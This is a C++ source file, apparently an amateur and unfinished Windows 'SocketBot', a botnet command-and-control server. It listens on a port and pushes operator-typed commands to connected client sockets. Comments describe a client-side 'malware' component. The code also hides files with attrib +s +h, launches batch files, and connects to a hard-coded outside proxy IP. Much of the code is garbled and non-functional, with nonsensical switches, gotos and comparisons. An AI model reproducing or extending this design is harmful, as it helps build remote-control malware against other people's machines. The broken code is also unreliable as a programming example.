// SocketBot.cpp : This file contains the 'main' function. Program execution begins and ends there.
/**************************************************************************************************
																					   -_-_-_-_-_/
 	______  |||||||    ||======	 \     /	|||||||  |======     ||`			_______    ||
	¬¬¬¬¬   ||----		|		 *\	  /		||----     |\		 ||----|        |	   |   ||                
	¬¬¬¬¬   |||||||		\			V		|||||||    | \       ||____|		|______|   ||
****¬¬¬******************************************************************************************/
	
#include <WinSock2.h>
#include <Windows.h>
#include <string>
#include <iostream>
#include <thread>
#include <array>
#include <direct.h>;
#include <sstream>;
#include <filesystem>;
#include <sstream>;
#include <Ws2tcpip.h>;
#include <tchar.h>;
#include <fstream>;
#include <stack>;
#include <list>;
#include <map>;
#include <vector>;
#include <algorithm>;

#pragma comment(lib,"ws2_32.lib")
const static int PORT = 45444;
std::list <SOCKET> sockets;
SOCKET serverSocket;
SOCKET s;
std::string currCommand = "";

int FindDir() {

	printf("\n");
	printf("\x1B[31m DIRECTORY LOOK UP!\033[0m\t\t");
	char command[50] = "cd";
	system(command);
	char commands[50] = "dir";
	system(commands);
	
	return 0;		//return memory addresses of each directory
						//Change from int	
}	
//Handle command input in console

int FindFiles() {
	printf("\x1B[31m ______C Drive DIRECTORY LOOK UP!________\033[0m\t\t");
	char command1[50] = "cd";
	system(command1);
	char command2[50] = "dir c:\\*";
	system(command2);

	return 0;

} 

//custom file selection
// //FIX NEW THREAD
//FIX SO INPUT CAN BE3 HANDLED BY NEW TASK THREAD
//put inside of main so thread variable can be inside of scope
std::string FileSelection() {
	system("cls");
	std::cout << "\n" << currCommand << std::endl;
	std::cout << "\n"<<"command input for file tasks:\t";

	
	std::string InputNew = "";
	getline(std::cin, InputNew);
	currCommand = InputNew;
	std::cin >> InputNew;
	//now console input prompt data input into Input string 
	std::cout << "This is your Input:" << InputNew; //new input displayed

	switch (InputNew == "") {
		//due to byte size switch case lol 
	case 'C': char commands[50] = "cd";
		system(commands); //system thrown cmd command
		char commandss[50] = "dir c:\\*";
		system(commandss); //shows all C drive files
		//expand now
	/*default:
		if(InputNew = nullptr && )std::cout<<InputNew<<"Need a command";;
		*/
	}return InputNew;
}
/// <summary>	
/// COMMANDS ABOVE THE BOTNET////// 
/// </summary>

void TaskInput() {//convert to switch statement or add ternary ops 

	bool inputloop = true;
	while (inputloop == true) {
		system("cls");

		std::cout << "Current command:" << currCommand << std::endl;
		std::cout << "Type the new command:\t";

		//Parse/Get the input 

		std::string response;
		getline(std::cin, response);

		//if string is typed then activate method


		//set new command
		currCommand = response;

		//Delay 
		Sleep(1);
		if (response.size() != 0 && response == "Dir") {
			FindDir();
			bool wait = true;
			if (response == "Dir") {
				printf("\033[3;33;35m----(Thread Suspended)----\033[0m\n");
				printf("\n");
				printf("\n");
				printf("\033[1;33;35m$(press A to go Back!)\033[0m\t\t");
			}
			while (wait == true) {
				int time = 0;
				time++;
				Sleep(time);
				if (GetKeyState('A') & 0x8000)
				{
					wait = false;
					time--;
					Sleep(time);
					boolean a = true; //do something with boolean a
					for (boolean a = true; time--;) {
						do {
							SetThreadExecutionState(true);
							break;//break from nested loop 
						} while (time == 0);
					}
				}
				else {
					boolean a = false;
					wait = true;
				} //expand and refactor for less bugs 
			}
		}
		else if (response == "Connect") {
			bool wait = true;
			bool ConnectToHost();
			std::cout << ConnectToHost();
			while (wait == true) {
				int waiting = 0;
				waiting++;
				Sleep(waiting);
				if (GetKeyState('A') & 0x8000) {
					wait = false;
					waiting--;
					Sleep(waiting);
				}
			}
		}
		else if (response == "Continue") {
			bool wait = true;
			while (wait == true) {
				int waiting = 0;
				waiting++;
				Sleep(waiting);
				return;
				if (GetKeyState('A') & 0x8000) {
					wait = false;
					waiting--;
					Sleep(waiting);
				}
			}
		}
		else if (response == "FileSelect") {//FIX THIS COMMAND NOT PRIORITY YET
			bool wait = true;
			std::string FileSelection();
			while (wait == true) {
				int waiting = 0;
				waiting++;
				Sleep(waiting);
				std::thread File(FileSelection);
				FileSelection();
				if (GetKeyState('?') & 0x8000) {
					wait = false;
					waiting--;
					Sleep(waiting);
				}
			}
		}
		else if (response == "Files") {
			bool state = true;
			FindFiles();
			printf("\033[3;33;35m----(Thread Suspended)----\033[0m\n");
			printf("\n");
			printf("\n");
			printf("\033[1;33;35m$(press A to go Back!)\033[0m\t\t");
			while (state == true) {

				int time = 0;
				time++;
				Sleep(time);
				if (GetKeyState('A') & 0x8000) {
					state = false;
					time--;
					Sleep(time);
				}

				//sort out need more
			}
		}
		else if (response == "Socket") {
			//send current command to socket 
			bool state = true;
			void Socket();
			printf("\033[3;30;35m----(Sockets)----\033[0m\n");
			printf("\n");
			printf("\n");
			printf("\033[1;33;35m$(press A to go Back!)\033[0m\t\t");
			while (state == true) {					//[TODO]
				//ADD FURTHER DEFAULT COMMANDS IN LIST DISPLAY
				int time = 0;						//ADD FUNCTIONALITY TO WRITE STRINGS (INPUT) INTO A FILE.BAT WHICH IS THEN EXECUTED VAI methods
				time++;								//default batch files list||write Custom batch files 
				Sleep(time);
				if (GetKeyState('A') & 0x8000) {
					state = false;
					time--;
					Sleep(time);
				}
				//functionality here 
			}
		}
		//Send command to socket connection
		else if (response == "BatchFile") {
			bool state = true;
			void BatchFiles();
			printf("\033[3;30;35m----(Batch file has been executed in a..\n new enviroment block!)----\033[0m\n");
			printf("\n");
			printf("\n");
			printf("\033[1;33;35m$(press A to go Back!)\033[0m\t\t");
			while (state == true) {					//[TODO]
				//ADD FURTHER DEFAULT COMMANDS IN LIST DISPLAY
				int time = 0;						//ADD FUNCTIONALITY TO WRITE STRINGS (INPUT) INTO A FILE.BAT WHICH IS THEN EXECUTED VAI methods
				time++;								//default batch files list||write Custom batch files 
				Sleep(time);
				if (GetKeyState('A') & 0x8000) {
					state = false;
					time--;
					Sleep(time);
				}
				//functionality here 
			}
		}
	}
}
//STILL IN WORKING PROGRESS****************************************// //FIX THIS AND UPDATE TO WORK PROPERLY
bool Socket(SOCKET Connections, SOCKET clientSockets) {
	SOCKADDR_IN clientAddr;
	int clientSize = sizeof(clientAddr);
	clientSockets = accept(serverSocket, (sockaddr*)&clientAddr, &clientSize);
	// reading 

	int bufferLength = 4096;
	char buffer[4096];

	//recieve the data from socket

	int iResult = recv(clientSockets, buffer, bufferLength, 0);
	//parse commands 
	

	std::string request = std::string(buffer, buffer + iResult);
	//send server commands to client
		send(clientSockets, currCommand.c_str(), currCommand.length(), 0);//Send command to socket connection
		//check if new socket has connected from other file sending socket to reach out 
		//to server.
		if ((SOCKET*)Connections != nullptr) {
							//ONCE ITS INSIDE OF TASK INPUT RESPONSE FROM SERVER THROWN INTO CURRRENT COMMANDS THEN SENT ACROSS SOCKET
		s:clientSockets; //socket s global inherits clientSocket from server 

		send(s, currCommand.c_str(), currCommand.length(), 0);
		return true;
		}
		
	}
//Batch file creation
void BatchFiles() { //FIX AND MAKE WORK PROPERLY

	std::wstring CreateBatch();
	std::wstring GetEnvString();

}

std::wstring CreateBatch(std::wstring returns) {

	struct BatchCommandHandler {
		char Filename[80];
		char Number[100];
		char Word[8000];
	}Batch;


	auto Fn = Batch.Filename;
	auto Number = Batch.Number;
	auto Words = Batch.Word;

	Fn == "Batch script(1)";
	Number[10] = { (char)"'1''2''3''4''5''6''7''8''9''0'" };
	Words[27] = { (char)"'A''B''C''D''E''F''G''H''I''J''K'L'M''N''O''P''Q''R''S''T''U''V''W'X''Z'Y''" };

	for (int i = 0; (const char*)i < Words; i++) {

		std::cout << "This is the batch input feild:" << Words[i] << Number[i];
		std::cout << "INPUT BATCH COMMAND LINE:\n";

		std::string Input;
		std::stringstream ss;
		ss >> Input;
		getline(std::cin, Input);
		switch (Input == "") {
		case 'A':  std::cout << "" << Input;
		case 'B': std::cout << "" << Input;
		case 'C': std::cout << "" << Input;
		case 'D':  std::cout << "" << Input;
		case 'E': std::cout << "" << Input;
		case 'F': std::cout << "" << Input;
		case 'G':  std::cout << "" << Input;
		case 'H': std::cout << "" << Input;
		case 'I': std::cout << "" << Input;
		case 'J':  std::cout << "" << Input;
		case 'K': std::cout << "" << Input;
		case 'L': std::cout << "" << Input;
		case 'M':  std::cout << "" << Input;
		case 'N': std::cout << "" << Input;
		case 'O': std::cout << "" << Input;
		case 'P':  std::cout << "" << Input;
		case 'Q': std::cout << "" << Input;
		case 'R': std::cout << "" << Input;
		case 'S':  std::cout << "" << Input;
		case 'T': std::cout << "" << Input;
		case 'U': std::cout << "" << Input;
		case 'V':  std::cout << "" << Input;
		case 'W': std::cout << "" << Input;
		case 'X': std::cout << "" << Input;
		case 'Y':  std::cout << "" << Input;
		case 'Z': std::cout << "" << Input;
		default:
			if (Input.empty() == true) {
				std::cout << "Input is invalid";
			}
		returns:Input;
		}
	}return returns;
}
	std::wstring GetEnvString() ///CREATE BATCH FILE TO BE OPENED IN HERE	
	{
		wchar_t* env = GetEnvironmentStrings();
		if (!env)
			abort();
		const wchar_t* var = env;
		size_t totallen = 0;
		size_t len;
		while ((len = wcslen(var)) > 0)
		{
			totallen += len + 1;
			var += len + 1;
		}
		std::wstring result(env, totallen);
		FreeEnvironmentStrings(env);
		return result;
	}
	//write batch algo for different batch file execution defaults and box to write batch strings into "created files" for execution of custom batch's;
	int start()
	{
		std::wstring env = GetEnvString();
		env += L"myvar=boo";
		env.push_back('\0'); // 0/Null termination on push

		STARTUPINFO si = { sizeof(STARTUPINFO) };
		PROCESS_INFORMATION pi;
								//cmd.exe /C C:\\Desktop\\BATCHFILE.bat
		wchar_t cmdline[] = L"cmd.exe /C C:\\Desktop\\chess.bat"; //will run cmd command line via new enviroment block through path on c:\

		if (!CreateProcess(NULL, cmdline, NULL, NULL, false, CREATE_UNICODE_ENVIRONMENT,
			(LPVOID)env.c_str(), NULL, &si, &pi))
		{
			std::cout << GetLastError();
			abort();
		}
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	////
	char INFO[100] = {};
	////



//CONNECTTOHOST – Connects to a remote host
	//FOR SEPERATE FILE
	//CONNECT TO HOST WILL BE MALWARE TO CONNECT THE CLIENT TO THE SERVER 
	//THEN SOCKET METHOD WILL SEND A PERSISTENT SERVER SOCKET TO THE CLIENT 
bool ConnectToHost()//FIX MAKE IT WORK BETTER WITH INFO
{
	 //Socket handle
	
	WSADATA wsadata;// starting the winsock api !

	int error = WSAStartup(0x0202, &wsadata);

	//error occured
	if (error)
		return false;

	//Sock initalisation:
	SOCKADDR_IN target;              

	target.sin_family = AF_INET;      
	target.sin_port = htons(PORT); 
	target.sin_addr.s_addr = htonl(INADDR_ANY);
	InetPton(AF_INET, _T("127.0.0.1"), &target.sin_addr.s_addr);//fixed instead of inet_addr
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Create socket
	if (s == INVALID_SOCKET)
	{
		printf("invalid socket");
		return false; //Couldn't create the socket

	}

	//connecting socket
	try {
		if (connect(s, (SOCKADDR*)&target, sizeof(target)) == SOCKET_ERROR)
		{
			printf("failed to connect faulty socket\n");
			std::cout << "SOCKET ERROR: " << SOCKET_ERROR;                //Couldn't connect
			return false;
		}
		else if (connect(s, (SOCKADDR*)&target, sizeof(target) != SOCKET_ERROR)){
			//SEND MESSAGE TO SOCKET THEN DISPLAY IT FROM SERVER SIDE
			Sleep(4000);
			printf("[FROM: SERVER] connected a socket to server");
			return true;
		}
	}
	catch (...) {
		return SOCKET_ERROR;
	}
}
SOCKET Connectnrecievesocketnsave() {
	try { 
		while (true) {

			SOCKADDR_IN clientAddr;
			int clientSize = sizeof(clientAddr);


			//accept the incoming connection
			//this is blocked until someone connects
			//accepts client connections
			SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientSize);
			//socket for	
			//connects client to server 
			if (ERROR == new auto (ERROR)) {
				std::cout << (char)ERROR;
				goto Connection;
			}
			else if(ERROR) {
				return ERROR;
			}
			for (int i = 0; i < 10000; i++){
				printf(".");
				if (std::cout << "...") {
					printf("\n");
				}
			}
			printf("/n", R"(----------------------)");
			printf("[FROM: SERVER]\n %s ACCEPTING NEW SOCKET]]");
			printf("/n", R"(----------------------)");
			for (int i = 0; i < 10000; i++) {
				printf(".");
				if (std::cout << "...") {
					printf("\n");
				}
			}
			printf("[FROM: SERVER] CONNECTED SOCKET TO SERVER!");
		Connection:	try {
			SOCKET* newsock = new SOCKET;
			auto NOW = getsockname(clientSocket, (sockaddr*)&clientAddr, &clientSize);
			connect(NOW, (sockaddr*)&clientAddr,clientSize);
            //transfer file to client 
			//send file to client
			switch (NOW) {
			case !NULL:
				auto INFO = { NOW };
				
				sockets.push_back(clientSocket);
				std::cout << "SOCKET: " << clientSocket << " CONNECTED TO SERVER";
				Sleep(6000);
				printf("\n   [FROM: SERVER] CONNECTING......");
				clientSocket = connect(serverSocket, (sockaddr*)&clientAddr, clientSize);
				Sleep(4000);
				printf("\n   [FROM: SERVER] ACCEPTING!");
				clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientSize);
				const char* SOCKDATA = "";//SEND--
				SOCKDATA == NULL;
				int bufferLength = 4096;//NULL CHECK
				char buffer[4096];//SEND--
				if (SOCKDATA != NULL|| SOCKDATA == NULL) {
					SOCKDATA = NULL;
				Send:
					Sleep(5000);
					std::cout << "\n[FROM: SERVER] confirming communication sending over!";
					Sleep(5000);
					SOCKDATA = "\n  [FROM: SERVER] -> DATA([PLEASE RESPOND CLIENT SOCKET!])";//method to allow const char into array of buffer
					strcpy_s(buffer, SOCKDATA);
					system("cls");
					Sleep(4000);
					//buffer destination // SOCKDATA == sender for strcpt_s;
					send(clientSocket, buffer, bufferLength, 0);//send data from buffer across to socket
					system("attrib + s + h D:filename");//filesystem::path_current >> var >> buffer
					send(clientSocket, buffer, bufferLength, 0);
					Sleep(4000);
					Sleep(5000);
					for (int i = 0; i < 100000; i++) {
						listen(s, 10);
						int iResults = recv(clientSocket, buffer, bufferLength, 0);
						//buffer[iResults] << buffer[iResults << '\0'];
						const char* data1[4096] = { buffer };
						if (data1 != NULL) {
							for (int i = 0; (char**)i < data1; i++)
							{
								buffer[iResults << '\0'] << '\0';
								printf(data1[i]);//works
								goto Socket;
								//DEFAULT RECEIEVER
								switch (data1[(const char)i] != NULL) {
								case 'A':std::cout << data1[(const char)i] << '%s';
								case 'B':std::cout << data1[(const char)i] << '%s';
								case 'C':std::cout << data1[(const char)i] << '%s';//for custom receiver from socket
								case 'D':std::cout << data1[(const char)i] << '%s';
								case 'E':std::cout << data1[(const char)i] << '%s';
								case 'F':std::cout << data1[(const char)i] << '%s';  				//{SEARCH FRUSTRATE DESTROY!}
								case 'G':std::cout << data1[(const char)i] << '%s';
								case 'H':std::cout << data1[(const char)i] << '%s';
								case 'I':std::cout << data1[(const char)i] << '%s';
								case 'J':std::cout << data1[(const char)i] << '%s';
								case 'K':std::cout << data1[(const char)i] << '%s';
								case 'L':std::cout << data1[(const char)i] << '%s';
								case 'M':std::cout << data1[(const char)i] << '%s';
								case 'N':std::cout << data1[(const char)i] << '%s';
								case 'O':std::cout << data1[(const char)i] << '%s';
								case 'P':std::cout << data1[(const char)i] << '%s';
								case 'Q':std::cout << data1[(const char)i] << '%s';
								case 'R':std::cout << data1[(const char)i] << '%s';
								case 'S':std::cout << data1[(const char)i] << '%s';
								case 'T':std::cout << data1[(const char)i] << '%s';
								case 'U':std::cout << data1[(const char)i] << '%s';
								case 'V':std::cout << data1[(const char)i] << '%s';
								case 'W':std::cout << data1[(const char)i] << '%s';
								case 'X':std::cout << data1[(const char)i] << '%s';
								case 'Y':std::cout << data1[(const char)i] << '%s';
								case 'Z':std::cout << data1[(const char)i] << '%s';
								case '[':std::cout << data1[(const char)i] << '%s';
								case ']':std::cout << data1[(const char)i] << '%s';
								case '!':std::cout << data1[(const char)i] << '%s';
								case ':':std::cout << data1[(const char)i] << '%s';
								case '=':std::cout << data1[(const char)i] << '%s';
								}
								data1 == NULL;
								i == NULL;
							}
						}
						else {
							remove(data1[i <= 4095]);
						}

					}
				}
			case NULL:
				break;
			}
		}
		catch (...)
		{
			int bufferLength = 4096;
			char buffer[4096];


			int iResult = recv(clientSocket, buffer, bufferLength, 0);

			std::string request = std::string(buffer, buffer + iResult);

			//handle commands
			//if send request then send over the command prompt / command handler to new
			//accepted socket.
			if (request == "Send") {
				//send current command to socket
				printf("SENT COMMANDS TO SOCKETS");
				SOCKET Stack[10] = { clientSocket };
				;//Send command to socket connection
				std::cout << "\n" <<(const char*)"[FROM:SERVER] SOCKET CONNECTION : " << clientSocket, clientAddr;
			}
			//START WORK ON CLIENT SOCKET AND USE CLIENT SOCKET INHERITANCE INSIDE OF METHOD FOR SOCKET CREATION				
	//close Client-connection
			closesocket(clientSocket);


			Sleep(2);


			closesocket(serverSocket);

			WSACleanup();

		}

	Socket:
		Sleep(10000);
		std::cout<<"\n"<<"[FROM: SERVER] CONFIRMED 2 WAY COMMS, CONNECTION SECURE NOW GOING TO SAVE SOCKET!";
		SOCKET SaveSockets[] = { clientSocket };
		Sleep(10000);
		std::cout<<"\n"<< "[FROM: SERVER] we have now saved the client socket!";
		std::cout << clientSocket;
		//printf((char*)'\n', '%s', (const char*)clientSocket);
		closesocket(clientSocket);
		Sleep(10000);
		system("cls");
		std::cout<<"\n [FROM: SERVER] SOCKET IS SAVED!";
		Sleep(4000);
		std::cout << "\n [MESSAGE!] what do you want for us to do now?  ";
		return SaveSockets[clientSocket];

		//std::thread threadInput(TaskInput); //jump back to thread START; //ERROR CASUES ABORT THREAD OVERLAP CALL?;

		//SEND OF TWO WAY COMMUNICATION
		}

	}
	catch (std::exception s) {

		if (ERROR == new auto (ERROR) || ERROR != NULL && nullptr) {
			if (EXCEPTION_BREAKPOINT == true) {
				std::cout << (char*)EXCEPTION_BREAKPOINT;
				EXCEPTION_BREAKPOINT == false;
				int bufferLength1 = 4096;
				char buffer1[4096];
				int errors[1] = { ERROR };
				if (ERROR == new auto (ERROR)) {
					ERROR >> errors[+1, ERROR];
					for (int i = 0; i < sizeof(errors); i++) {
						std::cout << "ERRORS:" << errors[i];
						//integer_stack.push(errors[i]);
						if (ERROR_ALREADY_EXISTS == true) {

							//integer_stack.pop();
							remove(ERROR);
							delete[] errors;
						}
						else {
							return ERROR;
							//integer_stack.push(ERROR);
						}
					}
				}

			}
		}
	}
}
//gonna control memory address allocation 
auto storage() {

	struct Storage {
		int* memoryaddress = reinterpret_cast<int*>(0x12345678);

		int* memoryaddress2 = reinterpret_cast<int*>(0x1234556);
	}Storage;

	if (Storage.memoryaddress != nullptr) {
		Storage.memoryaddress == nullptr;
		return Storage.memoryaddress, Storage.memoryaddress2;
	}
	else if (Storage.memoryaddress2 != nullptr) {
		Storage.memoryaddress2 = nullptr;
		return (int*)NULL;//offline for now as a mem storage
	}
}
auto StackCheck(){
using namespace std;
	stack<int> integer_stack1;
	stack<char> char_stack1;
	stack<bool> bool_stack1;
	stack<string> string_stack1;

//do something dynamically for stack
	//||
}/////vv
//_____________________/
SOCKET WEBSTAGE() {

		//MAKE THIS A HEADER FILE FUNCTION FOR CONNECTIONS SO LESS CODE - QUIKER COMP TIME.
	//DO O(n) checks once main built during optimisation stage!;
		system("cls");
		std::cout<<"OKay now starting the proxy connection";
		//connect to proxy server time 8)))-.ESKIMO \<[0..0]>/
		SOCKADDR_IN target{};
		int PORT1 = 8080;
		target.sin_family = AF_INET;
		target.sin_port = htons(PORT1);
		target.sin_addr.s_addr = htonl(INADDR_ANY);
		InetPton(AF_INET, _T("138.36.23.229"), &target.sin_addr.s_addr);
		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s == INVALID_SOCKET)
		{
			printf("invalid socket");
			return false;

		}
		try {
			bool flag = true;
			float timer = 0.000f;
			while (flag = true){
				timer += timer + 0.02;
				if (connect(s, (SOCKADDR*)&target, sizeof(target)) == SOCKET_ERROR)
				{
					printf("failed to connect faulty socket\n");
					std::cout << "SOCKET ERROR: " << SOCKET_ERROR;       
					return false;
				}
				//SERVER LOCATOR //soon will dynamically scower internet for secure proxy servers or via given list.
				else if (timer >= 100) {
					switch (timer > 100) {
					case 300:
						//connect to server 2 if timeout longer than 299;
					case 500://connect to server 3.....;
					case 700://connct to server 4....;
					default: std::cout << "sorry no servers currently in operation" << "\n";
					}
				}
				else if (connect(s, (SOCKADDR*)&target, sizeof(target) != SOCKET_ERROR)) {
					//SEND MESSAGE TO SOCKET THEN DISPLAY IT FROM SERVER SIDE
					printf("[FROM: SYSTEM] CONNECTING TO PROXY SERVER!\n");
					std::cout << "do you wish to make a custom request?\n";
					std::string inbox = "";
					std::cin >> inbox;
					const char* SOCKDATA = "";
					SOCKDATA == NULL;
					int bufferLength = 4096;
					char buffer[4096];
					buffer == NULL;
					SOCKDATA = "";
					system("cls");

					if (inbox == "yes") {
						std::cout << "[----------W--E--B--S--E--R--V--E--R-S----------]\n";
						std::cout << "CUSTOM Request: ";
						inbox = "";
						std::cin >> inbox;
						(std::string)SOCKDATA = inbox;
						strcpy_s(buffer, (const char*)SOCKDATA);
						send(s, buffer, bufferLength, 0);
						while (true) {
							listen(s, 10);
							if (recv(s, buffer, bufferLength, 0) != NULL) {
								goto skip;
							}
						}
						skip:
						int iResults = recv(s, buffer, bufferLength, 0);
						buffer[iResults << '\0'] << '\0';
						const char* data1[4096] = { buffer };
						std::cout << "\n";
						for (int i = NULL; (char**)i < data1; i++)
						{
							if (data1[i] != NULL) {
								
								printf(data1[i]);
							}
							return s;
						}
					}
					else {
						std::cout << "[---------WEB-REQUEST-LIST----------]\n";
						while (true) {
							std::cout << "CUSTOM LIST:\n";
							std::cout << "1: \n";
							std::cout << "2: \n";
							std::cout << "3: \n";
							std::cout << "SELECT ONE OF THEM!\n";
							inbox = "";
							std::cin >> inbox;
							switch (inbox == "") {
							case '1': system("cls");
								std::cout << "thanks for choosing option 1";
							case '2': system("cls"); 
								std::cout << "thanks for choosing option 2";
							case '3':system("cls"); 
								std::cout << "thanks for choosing option 3";
							default: flag = false;
							}
						}
					}
				}
			}
		}
		catch (...) {
			printf((const char*)SOCKET_ERROR);
			std::exception a;
			if (EXCEPTION_ACCESS_VIOLATION == true || ERROR == EXCEPTION_BREAKPOINT) {
				EXCEPTION_CONTINUE_EXECUTION == true;
				printf("ACCESS VIOLATION FIXING !"); //fix at some point dynamically if it occurrs
			}
			else {
				return SOCKET_ERROR;
			}
		}

		return s;
	}


int main() {

	using namespace std;
	stack<int> integer_stack;
	stack<char> char_stack;
	stack<bool> bool_stack;
	stack<string> string_stack;
	//gonna do something with the storage soon! --reminder: allocate memory allocation to appropriate memory addresses.
	struct Storage {
		int* memoryaddress = reinterpret_cast<int*>(0x12345678);
		int* memoryaddress2 = reinterpret_cast<int*>(0x1234556);
	}Storage;
	//FIND CURRENT FOLDER	EXAPND APON	
			//start input thread

	WSADATA wsaDate;

	if (WSAStartup(MAKEWORD(2, 2), &wsaDate) != 0) {
		return 0;
	}
	SOCKADDR_IN sockAddr;
	sockAddr.sin_port = htons(PORT);
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = htonl(INADDR_ANY);


	serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(bind(serverSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr)) == SOCKET_ERROR) {

		return 1;
	}
	listen(serverSocket, 10);
	thread* _thread = new thread(Connectnrecievesocketnsave);
	if (Connectnrecievesocketnsave != NULL) {
		if (_thread->joinable()) {
			_thread->join();
			delete _thread;
		}//task input (gui) once developed apon 
		TaskInput();//this will become a hidden debugger for development!
		std::cout << "okay gonna continue!";
		std::cout << "\nLets start the web stuff shall we?";
		
		std::cout << "\n" << "YES OR NO?";
		string answer;
		while (answer == "") {
			std::cin >> answer;
		}
		if (answer == "no"||"NO") {
			TaskInput();
		}//when pressing yes doesnt initally call method have to type "continue again //bug 
		else if (answer == "yes"||"YES"||"Yes") {

		}
		WEBSTAGE();
		}		//}
	}
